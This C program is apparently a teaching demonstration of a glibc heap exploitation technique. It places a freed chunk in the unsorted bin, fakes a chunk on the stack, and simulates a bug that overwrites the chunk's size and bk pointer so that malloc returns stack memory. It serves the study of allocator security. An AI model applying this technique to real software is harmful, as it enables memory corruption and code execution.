#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
  intptr_t stack_buffer[4] = {0};

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t* victim = malloc(0x100);

  fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
  intptr_t* p1 = malloc(0x100);

  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free(victim);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address");
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;

  //------------VULNERABILITY-----------
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
  fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
  //------------------------------------

  fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
  fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
}
